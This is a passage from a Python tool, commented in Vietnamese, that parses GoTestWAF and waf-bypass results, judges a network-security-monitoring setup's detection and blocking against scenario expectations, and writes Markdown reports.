                                          "sort": [{"@timestamp": "asc"}]})["hits"]["hits"]]
    except Exception as e:                    # noqa: BLE001
        note(f"   (không đọc được {index}: {e})")
        return []


def cmd_toolparse(a):
    """Đọc kết quả của công cụ bên ngoài (GoTestWAF / waf-bypass) -> bản ghi tác nhân."""
    s = alloc_ips(load_scn(a.file), a.slot)
    act = s["actor"][a.index]
    res = {"scenario": s["id"], "actor": a.index, "name": act.get("name", ""), "role": act.get("role", "attack"),
           "ip": act["_ips"][a.ipn], "kind": act.get("kind"), "t_start": a.t0, "t_end": a.t1, "sent": [], "extra": {}}
    summ = {}
    if act.get("kind") == "gotestwaf":
        rep = None
        for root, _, files in os.walk(a.path):
            for fn in files:
                if fn.endswith(".json"):
                    with open(os.path.join(root, fn), encoding="utf-8") as f:
                        rep = json.load(f)
        summ = gotestwaf_summary(rep) if rep else {"error": "không có báo cáo JSON"}
    elif act.get("kind") == "wafbypass":
        txt = open(a.path, encoding="utf-8", errors="replace").read()
        i = txt.find("{")
        try:
            summ = wafbypass_summary(json.loads(txt[i:])) if i >= 0 else {"error": "không có JSON"}
        except ValueError as e:
            summ = {"error": f"JSON hỏng: {e}", "head": txt[:300]}
    res["extra"]["tool"] = summ
    out(res)


def gotestwaf_summary(rep):
    """Tóm tắt báo cáo JSON của GoTestWAF. tp = bộ thử tấn công (bị chặn là đúng); tn = bộ thử lành tính (đi qua là
    đúng). sets: từng bộ thử con có gửi request."""
    def tot(d):
        d = d or {}
        return {"sent": d.get("total_sent", 0), "resolved": d.get("resolved_tests", 0), "blocked": d.get("blocked_tests", 0),
                "bypassed": d.get("bypassed_tests", 0), "unresolved": d.get("unresolved_tests", 0),
                "failed": d.get("failed_tests", 0)}
    sm = rep.get("summary") or {}
    tp, tn = sm.get("true_positive_tests") or {}, sm.get("true_negative_tests") or {}
    out_ = {"tool": "gotestwaf", "score": rep.get("score"), "tp": tot(tp.get("summary")), "tn": tot(tn.get("summary")),
            "tp_score": tp.get("score"), "tn_score": tn.get("score"), "sets": {}}
    for kind, node in (("tp", tp), ("tn", tn)):
        for grp, cases in (node.get("test_sets") or {}).items():
            for name, c in (cases or {}).items():
                if isinstance(c, dict) and c.get("sent"):
                    out_["sets"][f"{kind}:{grp}/{name}"] = {k: c.get(k, 0) for k in ("sent", "blocked", "bypassed", "unresolved")}
    return out_


def wafbypass_summary(js):
    """Tóm tắt kết quả waf-bypass. Mỗi khoá PASSED / BYPASSED / FALSED / FAILED là {"Nhóm/số.json": {vùng: ...}}.
    files = số tệp payload; zones = số cặp (payload, vùng đặt). Một payload có thể bị chặn ở vùng này, lọt ở vùng khác."""
    out_ = {"tool": "wafbypass", "files": {}, "zones": {}, "by_group": {}, "by_zone": {}}
    for k in ("PASSED", "BYPASSED", "FALSED", "FAILED"):
        v = js.get(k) or {}
        if not isinstance(v, dict):
            continue
        out_["files"][k] = len(v)
        nz = 0
        for name, zones in v.items():
            grp = str(name).split("/")[0]
            g = out_["by_group"].setdefault(grp, {})
            g[k] = g.get(k, 0) + 1
            zs = list(zones) if isinstance(zones, (dict, list)) else []
            nz += len(zs)
            if k in ("PASSED", "BYPASSED"):
                for z in zs:
                    zz = out_["by_zone"].setdefault(str(z), {})
                    zz[k] = zz.get(k, 0) + 1
        out_["zones"][k] = nz
    p_, b_ = out_["zones"].get("PASSED", 0), out_["zones"].get("BYPASSED", 0)
    out_["block_share_zones"] = round(p_ / (p_ + b_), 4) if p_ + b_ else None
    return out_


def pct1(a, b):
    return "—" if not b else f"{100 * a / b:.1f} %"


def tool_md(name, t):
    """Bảng Markdown cho kết quả của một công cụ bên ngoài (thay cho việc in nguyên khối JSON)."""
    L = []
    if t.get("error"):
        return [f"- {name}: LỖI đọc kết quả — {t['error']}"]
    if t.get("tool") == "gotestwaf":
        tp, tn = t["tp"], t["tn"]
        L += [f"**{name}** — điểm tổng {t.get('score')}", "",
              "| Bộ thử | Đã gửi | Bị chặn | Đi qua | Không xác định | Tỷ lệ đúng |", "|---|---|---|---|---|---|",
              f"| Tấn công (bị chặn là đúng) | {tp['sent']} | {tp['blocked']} | {tp['bypassed']} | {tp['unresolved']} | "
              f"{pct1(tp['blocked'], tp['resolved'])} |",
              f"| Lành tính (đi qua là đúng) | {tn['sent']} | {tn['blocked']} | {tn['bypassed']} | {tn['unresolved']} | "
              f"{pct1(tn['bypassed'], tn['resolved'])} |", "",
              "| Bộ thử con | Đã gửi | Bị chặn | Đi qua | Tỷ lệ bị chặn |", "|---|---|---|---|---|"]
        for k, c in sorted(t["sets"].items()):
            L.append(f"| {k} | {c['sent']} | {c['blocked']} | {c['bypassed']} | {pct1(c['blocked'], c['blocked'] + c['bypassed'])} |")
    elif t.get("tool") == "wafbypass":
        f, z = t["files"], t["zones"]
        L += [f"**{name}** — theo cặp (payload, vùng đặt): bị chặn {z.get('PASSED', 0)}, lọt {z.get('BYPASSED', 0)} "
              f"(tỷ lệ chặn {pct1(z.get('PASSED', 0), z.get('PASSED', 0) + z.get('BYPASSED', 0))}); chặn nhầm (FALSED) "
              f"{f.get('FALSED', 0)} tệp; lỗi (FAILED) {f.get('FAILED', 0)} tệp.", "",
              "| Nhóm | Tệp bị chặn (PASSED) | Tệp có vùng lọt (BYPASSED) | Chặn nhầm (FALSED) | Lỗi (FAILED) |", "|---|---|---|---|---|"]
        for g, c in sorted(t["by_group"].items()):
            L.append(f"| {g} | {c.get('PASSED', 0)} | {c.get('BYPASSED', 0)} | {c.get('FALSED', 0)} | {c.get('FAILED', 0)} |")
        L += ["", "| Vùng đặt payload | Bị chặn | Lọt | Tỷ lệ chặn |", "|---|---|---|---|"]
        for zn, c in sorted(t["by_zone"].items()):
            L.append(f"| {zn} | {c.get('PASSED', 0)} | {c.get('BYPASSED', 0)} | "
                     f"{pct1(c.get('PASSED', 0), c.get('PASSED', 0) + c.get('BYPASSED', 0))} |")
    else:
        L.append(f"- {name}: `{json.dumps(t, ensure_ascii=False)[:400]}`")
    return L + [""]


def per_ip_stats(run, obs):
    ip = run["ip"]
    web = [w for w in obs["web"] if w.get("src_ip") == ip]
    dec = [d for d in obs["decisions"] if d.get("src_ip") == ip]
    sent = run["sent"]
    g = Counter(x["gate"] for x in sent)
    first_g1 = next((x["t"] for x in sent if x["gate"] == "gate1"), None)
    blocks = [d for d in dec if d.get("decision") == "block"]
    t_last = sent[-1]["t"] if sent else run.get("t_start", 0)
    # "bị chặn" = lệnh chặn CÓ HIỆU LỰC khi tác nhân còn đang gửi (thấy 403 của Cổng 1, hoặc quyết định chặn trước
    # request cuối). Quyết định chặn đến sau khi đợt tấn công đã xong chỉ tính là "chặn muộn".
    in_time = first_g1 is not None or any((epoch(d["@timestamp"]) if d.get("@timestamp") else 1e18) <= t_last for d in blocks)
    labels = Counter(w.get("label") for w in web if w.get("source") == "web")
    net = Counter(w.get("label") for w in web if w.get("source") == "net" and w.get("label") not in ("benign", "info"))
    beh = Counter(w.get("b_shape") for w in web if w.get("source") == "behaviour" and w.get("label") == "behaviour")
    det = per_request_detected(sent, web)
    return {"ip": ip, "sent": len(sent), "gates": dict(g), "detected": sum(det), "any_detected": any(det),
            "blocked": in_time, "blocked_any": bool(blocks) or first_g1 is not None,
            "blocked_late": bool(blocks) and not in_time,
            "t_block_s": round(first_g1 - run["t_start"], 1) if first_g1 else None,
            "block_reasons": sorted({d.get("reason") for d in blocks}), "web_labels": dict(labels),
            "net_alerts": dict(net), "behaviour": dict(beh), "decisions": len(dec)}


def per_request_detected(sent, web):
    """Từng request có bị phát hiện không: Cổng 2 chặn, HOẶC classifier gắn nhãn tấn công cho bản ghi của nó, HOẶC bị
    Cổng 1 chặn (IP đã bị khoá vì phát hiện trước đó). Bản ghi ES được ghép với request đã gửi theo thời điểm (cùng IP,
    lệch ≤ 3 giây, mỗi bản ghi dùng một lần) — trước đây kịch bản chỉ lấy max(Cổng 2, classifier) cho cả nhóm."""
    docs = sorted((epoch(w["@timestamp"]), w.get("label") not in ("benign", None, "uninspected"))
                  for w in web if w.get("source") == "web" and w.get("@timestamp"))
    used = [False] * len(docs)
    out = []
    for x in sent:
        if x["gate"] == "gate1":
            out.append(True); continue
        flag = x["gate"] == "gate2"
        if x["gate"] in ("gate2", "pass"):
            best, bd = None, 3.0
            for k, (t, _) in enumerate(docs):
                if not used[k] and abs(t - x["t"]) <= bd:
                    best, bd = k, abs(t - x["t"])
            if best is not None:
                used[best] = True; flag = flag or docs[best][1]
        out.append(flag)
    return out


def cmd_judge(a):
    s = load_scn(a.file)
    runs = [json.loads(ln) for ln in open(a.runs, encoding="utf-8") if ln.strip().startswith("{")]
    obs = json.load(open(a.obs, encoding="utf-8")) if os.path.exists(a.obs) else {"web": [], "decisions": [], "gate": []}
    extra = {}
    roles = defaultdict(list)
    for r in runs:
        roles[r["role"]].append((r, per_ip_stats(r, obs)))
    m = {}
    for role, xs in roles.items():
        st = [x[1] for x in xs]
        sent = sum(x["sent"] for x in st)
        g = Counter()
        for x in st:
            g.update(x["gates"])
        det = sum(sum(v for k, v in x["web_labels"].items() if k not in ("benign", None)) for x in st)
        tb = [x["t_block_s"] for x in st if x["t_block_s"] is not None]
        m[role] = {"ips": len(st), "sent": sent, "gates": dict(g), "ips_blocked": sum(x["blocked"] for x in st),
                   "ips_blocked_any": sum(x["blocked_any"] for x in st), "ips_blocked_late": sum(x["blocked_late"] for x in st),
                   "gate2_share": round(g.get("gate2", 0) / max(sent, 1), 3),
                   "detected_share": round(sum(x["detected"] for x in st) / max(sent, 1), 3),
                   "undetected_actors": [r.get("name") or r["ip"] for r, x in xs if x["sent"] and not x["any_detected"]],
                   "classifier_flagged": det, "classifier_share": round(det / max(sent, 1), 3),
                   "t_block_median_s": sorted(tb)[len(tb) // 2] if tb else None,
                   "block_reasons": sorted({r for x in st for r in x["block_reasons"]}),
                   "net_alerts": sum(sum(x["net_alerts"].values()) for x in st),
                   "behaviour": dict(sum((Counter(x["behaviour"]) for x in st), Counter()))}
    e = s["expect"]
    checks = []

    def chk(name, ok, detail):
        checks.append({"check": name, "ok": bool(ok), "detail": detail})

    at, bn = m.get("attack", {}), m.get("benign", {})
    if "attack_blocked" in e and at:
        want = e["attack_blocked"]
        frac = at["ips_blocked"] / max(at["ips"], 1)
        need = e.get("attack_blocked_min_share", 1.0 if want else 0.0)
        ok = frac >= need if want else at["ips_blocked"] == 0
        if not want: ok = at["ips_blocked_any"] == 0
        chk("kẻ tấn công bị chặn IP (khi còn đang tấn công)" if want else "kẻ tấn công KHÔNG bị chặn IP", ok,
            f"{at['ips_blocked']}/{at['ips']} IP bị chặn kịp thời"
            + (f", {at['ips_blocked_late']} IP chỉ bị chặn sau khi đã dừng" if at["ips_blocked_late"] else ""))
    if "block_within_s" in e and at and at.get("t_block_median_s") is not None:
        chk(f"bị chặn trong {e['block_within_s']} s", at["t_block_median_s"] <= e["block_within_s"],
            f"trung vị {at['t_block_median_s']} s")
    elif "block_within_s" in e and at:
        chk(f"bị chặn trong {e['block_within_s']} s", False, "không bị chặn")
    if "detected_min_share" in e and at:
        share = at["detected_share"]                 # theo TỪNG request: Cổng 2 hoặc classifier (hoặc IP đã bị chặn)
        chk(f"phát hiện ≥ {int(100 * e['detected_min_share'])} % request tấn công", share >= e["detected_min_share"],
            f"{100 * share:.0f} % (Cổng 2 {100 * at['gate2_share']:.0f} %, classifier {100 * at['classifier_share']:.0f} %)")
    if e.get("each_actor_detected") and at:          # mỗi họ / tác nhân phải có ít nhất một lớp phát hiện được
        miss = at["undetected_actors"]
        chk("mọi tác nhân tấn công đều bị ít nhất một lớp phát hiện", not miss, ", ".join(miss) or "—")
    if "benign_blocked" in e and bn:
        if not e["benign_blocked"]:
            # Tách hai việc trước đây bị gộp: người dùng bị KHOÁ IP (lỗi nặng, phải bằng 0) và Cổng 2 chặn MỘT request
            # (báo nhầm của WAF, chấp nhận dưới ngưỡng benign_gate2_max_share)
            chk("người dùng hợp lệ KHÔNG bị khoá IP", bn["ips_blocked_any"] == 0,
                f"{bn['ips_blocked_any']}/{bn['ips']} IP bị chặn (kể cả chặn muộn)")
            lim = float(e.get("benign_gate2_max_share", 0.01))
            g2 = bn["gates"].get("gate2", 0)
            chk(f"Cổng 2 chặn ≤ {100 * lim:g} % request hợp lệ", g2 / max(bn["sent"], 1) <= lim,
                f"{g2}/{bn['sent']} ({100 * g2 / max(bn['sent'], 1):.1f} %)")
        else:
            bad = bn["ips_blocked_any"] + bn["gates"].get("gate2", 0)
            chk("người dùng hợp lệ bị chặn theo (đúng thiết kế)", bad > 0,
                f"{bn['ips_blocked_any']} IP bị chặn, {bn['gates'].get('gate2', 0)} request bị Cổng 2 chặn")
    for role, mm in m.items():                       # kỳ vọng chung cho vai bất kỳ: <vai>_blocked, <vai>_block_after_s
        if role in ("attack", "benign"):
            continue
        if f"{role}_blocked" in e:
            want = e[f"{role}_blocked"]
            n = mm["ips_blocked"] if want else mm["ips_blocked_any"]    # "không bị chặn": chặn muộn cũng tính
            chk(f"vai '{role}' {'bị' if want else 'KHÔNG bị'} chặn IP",
                (n > 0) == bool(want), f"{n}/{mm['ips']} IP bị chặn")
        if f"{role}_block_after_s" in e:
            t = mm.get("t_block_median_s")
            chk(f"vai '{role}' chỉ bị chặn sau {e[f'{role}_block_after_s']} s", t is not None and t >= e[f"{role}_block_after_s"],
                f"bị chặn sau {t} s" if t is not None else "không bị chặn")
    if "attack_block_after_s" in e and at:
        t = at.get("t_block_median_s")
        chk(f"chỉ bị chặn sau {e['attack_block_after_s']} s (khi thành phần trở lại)", t is not None and t >= e["attack_block_after_s"],
            f"bị chặn sau {t} s" if t is not None else "không bị chặn")
    if "collateral" in e:
        coll = sum(1 for r in runs for x in r["sent"] if x.get("fam") in ("benign", "benign_hard") and x["gate"] == "gate1")
        tot = sum(1 for r in runs for x in r["sent"] if x.get("fam") in ("benign", "benign_hard"))
        chk("request hợp lệ cùng IP bị chặn theo" if e["collateral"] else "không có request hợp lệ bị chặn theo",
            (coll > 0) == bool(e["collateral"]), f"{coll}/{tot} request hợp lệ bị Cổng 1 chặn")
        extra["nat"] = {"benign_requests": tot, "benign_blocked_by_gate1": coll}
    if "block_reason" in e and at:
        chk(f"lý do chặn: {e['block_reason']}", any(e["block_reason"] in r for r in at["block_reasons"]),
            ", ".join(at["block_reasons"]) or "—")
    for r in runs:
        if r.get("extra"):
            extra[f"{r['name'] or r['role']} {r['ip']}"] = r["extra"]
    if "recidivism_growth" in e:
        rr = next((v.get("rounds") for v in extra.values() if v.get("rounds")), [])
        d = [x["blocked_for_s"] for x in rr if x.get("blocked_for_s")]
        ok = len(d) >= 2 and all(d[i + 1] > d[i] * 1.5 for i in range(len(d) - 1))
        chk("thời hạn chặn tăng dần theo số lần tái phạm", ok, " → ".join(f"{x} s" for x in d) or "—")
    if "slowloris_capped" in e:
        sl = next((v for v in extra.values() if "alive_over_time" in v), {})
        alive = sl.get("alive_over_time", [0])
        chk(f"kết nối nhỏ giọt bị giới hạn ≤ {e['slowloris_capped']}", max(alive or [0]) <= e["slowloris_capped"],
            f"số kết nối còn sống theo thời gian: {alive}")
    judge_extra(s, e, runs, obs, roles, m, chk, extra)
    known_gap = bool(e.get("known_gap"))
    ok_all = all(c["ok"] for c in checks) if checks else None
    verdict = ("LỖ HỔNG ĐÃ BIẾT" if known_gap and ok_all else "ĐẠT" if ok_all else
               "KHÔNG ĐẠT" if checks else "CHỈ ĐO")
    if any("k" in x for r in runs for x in r["sent"]):
        extra["matrix"] = matrix_table(runs, obs)
    out({"id": s["id"], "title": s.get("title", ""), "case": s.get("case", ""), "verdict": verdict,
         "checks": checks, "metrics": m, "extra": extra, "notes": s.get("notes", "")})


def judge_extra(s, e, runs, obs, roles, m, chk, extra):
    """Các kỳ vọng thêm 13/11/2026: tỷ lệ theo vai, luật tự sinh (B3, D2, D4, E3, vòng đời), Cổng 1 sau khi chặn (B2),
    request dị dạng được ghi nhận (C2), nạp lại nginx (E5), bí mật không lưu (C1), nhịp tim / cảnh báo, thân POST."""
    acts = s.get("actor", [])
    real = [r for r in runs if r.get("role") != "system" and isinstance(r.get("actor"), int) and 0 <= r["actor"] < len(acts)]
    T0 = min((r["t_start"] - float(acts[r["actor"]].get("start_s", 0)) for r in real), default=time.time())
    # ---- tỷ lệ theo vai: <vai>_gate2_min_share / _max_share, <vai>_classifier_min_share / _max_share
    for role, mm in m.items():
        for key, fld, ge, label in (("gate2_min_share", "gate2_share", True, "Cổng 2 chặn"),
                                    ("gate2_max_share", "gate2_share", False, "Cổng 2 chặn"),
                                    ("classifier_min_share", "classifier_share", True, "classifier gắn nhãn tấn công"),
                                    ("classifier_max_share", "classifier_share", False, "classifier gắn nhãn tấn công")):
            k = f"{role}_{key}"
            if k not in e or k == "benign_gate2_max_share":   # benign_gate2_max_share đã chấm ở benign_blocked
                continue
            v, lim = mm[fld], float(e[k])
            chk(f"vai '{role}': {label} {'≥' if ge else '≤'} {100 * lim:g} % request", v >= lim if ge else v <= lim,
                f"{100 * v:.1f} % ({mm['sent']} request)")
    # ---- luật tự sinh tạo ra TRONG kịch bản này
    rules = [x for x in obs.get("rules", []) if float(x.get("since") or 0) >= T0 - 5]
    desc = "; ".join(f"{x.get('id')} {x.get('class')} {x.get('state')}/{x.get('reason')} [{(x.get('token') or '')[:50]}]"
                     for x in rules) or "không có luật nào"
    extra["rules"] = rules
    if "rule_classes_active" in e:
        got = {x.get("class") for x in rules if x.get("state") in ("active", "expired") or x.get("reason") == "shadow_passed"}
        need = set(e["rule_classes_active"])
        chk(f"luật tự sinh được ban hành cho lớp: {', '.join(sorted(need))}", need <= got, desc)
    if "rules_must_not_contain" in e:
        bad = [x for x in rules if any(t.lower() in json.dumps([x.get("token"), x.get("spec")], ensure_ascii=False).lower()
                                       for t in e["rules_must_not_contain"])]
        chk(f"không luật nào chứa {e['rules_must_not_contain']}", not bad, desc)
    if "rule_final_state" in e:
        chk(f"có luật đi hết tới trạng thái '{e['rule_final_state']}'", any(x.get("state") == e["rule_final_state"] for x in rules), desc)
    if "no_rule_created_during" in e:
        f = next((f for f in s.get("fault", []) if f.get("service") == e["no_rule_created_during"]), None)
        if f:
            a, b = T0 + float(f.get("stop_at_s", 0)), T0 + float(f.get("start_at_s", 10**9))
            inside = [x for x in rules if a <= float(x.get("since") or 0) < b]
            chk(f"không sinh luật mới khi {f['service']} dừng", not inside,
                (f"{len(inside)} luật sinh trong lúc dừng; " if inside else "0 luật sinh trong lúc dừng; ") + f"tất cả: {desc}")
    # ---- B2: sau lần chặn đầu, mọi request của IP đó bị Cổng 1 trả 403 và nhanh
    att = roles.get("attack", [])
    if "gate1_after_block_min_share" in e or "gate1_latency_ms_max" in e:
        after, g1ms = [], []
        for r, _ in att:
            i0 = next((i for i, x in enumerate(r["sent"]) if x["gate"] == "gate1"), None)
            if i0 is not None:
                after += r["sent"][i0:]
        g1ms = sorted(x["ms"] for x in after if x["gate"] == "gate1")
        if "gate1_after_block_min_share" in e:
            sh = sum(x["gate"] == "gate1" for x in after) / max(len(after), 1)
            chk(f"sau lần chặn đầu: ≥ {100 * e['gate1_after_block_min_share']:g} % request bị Cổng 1 trả 403",
                bool(after) and sh >= e["gate1_after_block_min_share"],
                f"{sum(x['gate'] == 'gate1' for x in after)}/{len(after)} request")
        if "gate1_latency_ms_max" in e:
            med = g1ms[len(g1ms) // 2] if g1ms else None
            ok_ms = [x["ms"] for r, _ in att for x in r["sent"] if x["gate"] in ("pass", "gate2")]
            ok_med = sorted(ok_ms)[len(ok_ms) // 2] if ok_ms else None
            chk(f"thời gian phản hồi 403 của Cổng 1 (trung vị) ≤ {e['gate1_latency_ms_max']} ms", med is not None and med <= e["gate1_latency_ms_max"],
                f"{med} ms (request đi tới Apache: {ok_med} ms)")
    # ---- C2: request dị dạng bị từ chối phải được ghi nhận (gate-events của nginx hoặc apache-errors)
    if "malformed_recorded_min_share" in e:
        rej = sum(1 for r, _ in att for x in r["sent"] if x["gate"] in ("reject", "gate1", "limit"))
        rec = sum(int(g.get("count") or 1) for g in obs.get("gate", [])) + sum(int(a.get("count") or 1) for a in obs.get("apache_errors", []))
        sh = min(1.0, rec / max(rej, 1))
        chk(f"request dị dạng bị từ chối được ghi nhận ≥ {100 * e['malformed_recorded_min_share']:g} %",
            rej > 0 and sh >= e["malformed_recorded_min_share"], f"{rec} bản ghi / {rej} request bị từ chối")
    # ---- E5: số lần nginx nạp lại danh sách chặn
    if "nginx_reload_max_per_min" in e:
        sysx = next((r.get("extra") for r in runs if r.get("role") == "system" and "nginx_reloads" in (r.get("extra") or {})), None)
        if sysx:
            per = sysx["nginx_reloads"] / max(sysx["duration_s"] / 60, 1e-6)
            chk(f"nginx nạp lại ≤ {e['nginx_reload_max_per_min']} lần/phút", per <= e["nginx_reload_max_per_min"],
                f"{sysx['nginx_reloads']} lần trong {sysx['duration_s']:.0f} s ({per:.1f} lần/phút)")
        else:
            chk(f"nginx nạp lại ≤ {e['nginx_reload_max_per_min']} lần/phút", False, "không đếm được")
    # ---- C1: bí mật không còn nguyên văn trong Elasticsearch
    if e.get("secrets_absent"):
        sc = obs.get("secret_check") or {}
        chk("mật khẩu / token đã gửi không còn nguyên văn trong Elasticsearch",
            sc.get("secrets", 0) > 0 and sc.get("docs_checked", 0) > 0 and sc.get("docs_with_secret", 1) == 0,
            f"{sc.get('docs_with_secret')} / {sc.get('docs_checked')} bản ghi chứa giá trị bí mật "
            f"({sc.get('secrets')} giá trị đã gửi){'; trường: ' + ', '.join(sc.get('fields') or []) if sc.get('fields') else ''}")
    # ---- nhịp tim ngừng trong lúc dịch vụ dừng và trở lại sau đó; Grafana bật cảnh báo
    if "heartbeat_gap" in e:
        svc = e["heartbeat_gap"]
        f = next((f for f in s.get("fault", []) if f.get("service") == svc), None)
        hb = [epoch(h["@timestamp"]) for h in obs.get("health", []) if h.get("service") == svc and h.get("@timestamp")]
        if f:
            a, b = T0 + float(f.get("stop_at_s", 0)) + 45, T0 + float(f.get("start_at_s", 0))
            during = [t for t in hb if a <= t < b]
            after_ = [t for t in hb if t >= b]
            chk(f"nhịp tim của {svc} ngừng khi dừng và có lại sau khi bật", not during and bool(after_),
                f"{len(during)} nhịp trong lúc dừng, {len(after_)} nhịp sau khi bật")
    if "alert_fired" in e:
        al = obs.get("alerts")
        key = e["alert_fired"].lower()
        fired = [a for a in (al or []) if (a.get("newState") or "").lower().startswith("alerting")
                 and key in ((a.get("alertName") or "") + " " + (a.get("text") or "")).lower()]
        chk(f"Grafana bật cảnh báo chứa '{e['alert_fired']}'", bool(fired),
            "không đọc được Grafana" if al is None else (f"{len(fired)} lần chuyển sang Alerting" if fired else
                                                         f"không có ({len(al)} sự kiện cảnh báo khác)"))
    # ---- thân POST tới được classifier (xoay nhật ký khi tải cao)
    if "bodies_received_min_share" in e:
        bn = roles.get("benign", [])
        ips = {r["ip"] for r, _ in bn}
        sent_ok = sum(1 for r, _ in bn for x in r["sent"] if x["gate"] in ("pass", "gate2"))
        got = sum(1 for w in obs.get("web", []) if w.get("src_ip") in ips and w.get("source") == "web" and w.get("has_body"))
        sh = got / max(sent_ok, 1)
        chk(f"thân POST tới classifier ≥ {100 * e['bodies_received_min_share']:g} %", sent_ok > 0 and sh >= e["bodies_received_min_share"],
            f"{got}/{sent_ok} request có thân trong Elasticsearch")


def matrix_table(runs, obs):
    rx = re.compile(re.escape(MARK) + r"/[^/]+/[^/]+/(\d+)/(\d+)")
    by_k = {}
    for w in obs["web"]:
        if w.get("source") == "web":
            mm = rx.search(w.get("ua") or "")
            if mm:
                by_k[(int(mm.group(1)), int(mm.group(2)))] = w
    cells = defaultdict(lambda: Counter())
    for r in runs:
        for x in r["sent"]:
            if "k" not in x:
                continue
            w = by_k.get((int(r.get("actor", 0)), x["k"]))
            key = f"{x['fam']}|{x['place']}|{x['ev']}"
            c = cells[key]
            c["n"] += 1
            c["gate2"] += x["gate"] == "gate2"
            c["clf"] += bool(w and w.get("label") not in (None, "benign"))
            c["in_es"] += bool(w)
            c["any"] += (x["gate"] == "gate2") or bool(w and w.get("label") not in (None, "benign"))
    return {k: dict(v) for k, v in cells.items()}


# =====================================================================
# report
# =====================================================================
def pct(a, b):
    return "—" if not b else f"{100 * a / b:.0f} %"


def cmd_report(a):
    res = [json.loads(ln) for ln in open(a.results, encoding="utf-8") if ln.strip().startswith("{")]
    L = [f"# Kết quả khung kịch bản NSM — lượt {a.run}", "",
         "Sinh tự động bởi `tools/scenario.sh`. Dữ liệu thô nằm cùng thư mục.", "",
         "## 1. Tổng hợp", "", "| Kịch bản | Ca spec | Kết luận | Kiểm tra |", "|---|---|---|---|"]
    for r in res:
        ok = sum(c["ok"] for c in r["checks"]); n = len(r["checks"])
        L.append(f"| `{r['id']}` — {r['title']} | {r['case'] or '—'} | **{r['verdict']}** | {ok}/{n} |")
    v = Counter(r["verdict"] for r in res)
    L += ["", "Đếm: " + ", ".join(f"{k}: {n}" for k, n in v.most_common()), "",
          "**ĐẠT** = đúng kỳ vọng. **KHÔNG ĐẠT** = sai kỳ vọng. **LỖ HỔNG ĐÃ BIẾT** = hệ thống lọt đúng như dự kiến "
          "(kịch bản ghi lại giới hạn, không phải lỗi mới). **CHỈ ĐO** = kịch bản không có kỳ vọng.", "",
          "## 2. Chi tiết từng kịch bản", ""]
    for r in res:
        L += [f"### `{r['id']}` — {r['title']}", "", f"Ca spec: {r['case'] or '—'}. Kết luận: **{r['verdict']}**.", ""]
        if r.get("notes"):
            L += [r["notes"], ""]
        for c in r["checks"]:
            L.append(f"- {'✔' if c['ok'] else '✘'} {c['check']}: {c['detail']}")
        if r["checks"]:
            L.append("")
        L += ["| Vai | IP | Request | Cổng 2 chặn | Classifier gắn nhãn | IP bị chặn | Thời gian chặn (trung vị) | "
              "Lý do chặn | Cảnh báo Suricata | Tầng 3 |", "|---|---|---|---|---|---|---|---|---|---|"]
        for role, mm in r["metrics"].items():
            L.append(f"| {role} | {mm['ips']} | {mm['sent']} | {pct(mm['gates'].get('gate2', 0), mm['sent'])} | "
                     f"{pct(mm['classifier_flagged'], mm['sent'])} | {mm['ips_blocked']}/{mm['ips']} | "
                     f"{mm['t_block_median_s'] if mm['t_block_median_s'] is not None else '—'} s | "
                     f"{', '.join(mm['block_reasons']) or '—'} | {mm['net_alerts']} | "
                     f"{', '.join(f'{k}: {v}' for k, v in mm['behaviour'].items()) or '—'} |")
        L.append("")
        for name, ex in r.get("extra", {}).items():
            if name == "matrix":
                continue
            if isinstance(ex, dict) and isinstance(ex.get("tool"), dict):
                L += tool_md(name, ex["tool"])
                continue
            L.append(f"- Số liệu thêm ({name}): `{json.dumps(ex, ensure_ascii=False)[:400]}`")
        if "matrix" in r.get("extra", {}):
            L += matrix_md(r["extra"]["matrix"])
        L.append("")
    print("\n".join(L))


def matrix_md(cells):
    fams = sorted({k.split("|")[0] for k in cells}, key=lambda f: (f not in CORE, f))
    places = [p for p in PLACEMENTS if any(k.split("|")[1] == p for k in cells)]
    evs = sorted({k.split("|")[2] for k in cells})
    L = ["", "**Ma trận phát hiện** — ô = tỷ lệ request bị phát hiện (Cổng 2 chặn HOẶC classifier gắn nhãn tấn công); "
         "trong ngoặc: Cổng 2 / classifier.", ""]
    for ev in evs:
        L += [f"Né tránh: `{ev}`", "", "| Họ \\ Vị trí | " + " | ".join(places) + " |",
              "|---|" + "---|" * len(places)]
        for f in fams:
            row = []
            for p in places:
                c = cells.get(f"{f}|{p}|{ev}")
                row.append("—" if not c else f"{pct(c['any'], c['n'])} ({c['gate2']}/{c['clf']})")
            L.append(f"| {f} | " + " | ".join(row) + " |")
        L.append("")
    return L


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--run", default="manual")
    sub = ap.add_subparsers(dest="cmd", required=True)
    p = sub.add_parser("plan"); p.add_argument("file"); p.add_argument("--slot", type=int, default=0)
    p = sub.add_parser("actor"); p.add_argument("file"); p.add_argument("--slot", type=int, default=0)
    p.add_argument("--index", type=int, required=True); p.add_argument("--ipn", type=int, default=0)
    sub.add_parser("observe")
    p = sub.add_parser("toolparse"); p.add_argument("file"); p.add_argument("--slot", type=int, default=0)
    p.add_argument("--index", type=int, required=True); p.add_argument("--ipn", type=int, default=0)
    p.add_argument("--path", required=True); p.add_argument("--t0", type=float, default=0); p.add_argument("--t1", type=float, default=0)
    p = sub.add_parser("judge"); p.add_argument("file"); p.add_argument("--runs", required=True)
    p.add_argument("--obs", required=True)
    p = sub.add_parser("report"); p.add_argument("--results", required=True)
    a = ap.parse_args()
    {"plan": cmd_plan, "actor": cmd_actor, "observe": cmd_observe, "judge": cmd_judge, "report": cmd_report,
     "toolparse": cmd_toolparse}[a.cmd](a)


if __name__ == "__main__":
    main()
